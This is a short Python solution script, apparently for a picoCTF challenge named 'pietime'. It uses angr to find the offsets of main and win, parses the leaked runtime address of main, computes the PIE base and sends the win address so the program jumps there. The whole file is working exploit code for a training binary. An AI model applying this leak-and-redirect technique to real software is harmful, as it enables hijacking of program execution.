

from pwn import *
import angr


BINARY_PATH = './pietime'
REMOTE = False  
REMOTE_HOST = 'rescued-float.picoctf.net'
REMOTE_PORT = 57918


project = angr.Project(BINARY_PATH, auto_load_libs=False)
main_offset = project.loader.main_object.get_symbol('main').relative_addr
win_offset = project.loader.main_object.get_symbol('win').relative_addr

print(f"[+] main() offset: {hex(main_offset)}")
print(f"[+] win() offset:  {hex(win_offset)}")


if REMOTE:
    conn = remote(REMOTE_HOST, REMOTE_PORT)
else:
    conn = process(BINARY_PATH)

# printed address of main at runtime
received = conn.recvline_contains(b"Address of main:").decode()
print(f"[+] Received: {received.strip()}")

# Parse the address
import re
match = re.search(r'0x[0-9a-f]+', received)
if not match:
    print("[-] Couldn't find main address!")
    exit(1)

main_runtime_addr = int(match.group(0), 16)
print(f"[+] Runtime main address: {hex(main_runtime_addr)}")

# Calculate real win address
real_base = main_runtime_addr - main_offset
real_win_addr = real_base + win_offset
print(f"[+] Real win address to jump to: {hex(real_win_addr)}")

# Send the win address
conn.recvuntil(b"Enter the address to jump to")
conn.sendline(hex(real_win_addr).encode())

# Get result
result = conn.recvall(timeout=5)
print("\n[!] Final Output:\n")
print(result.decode(errors='ignore'))

conn.close()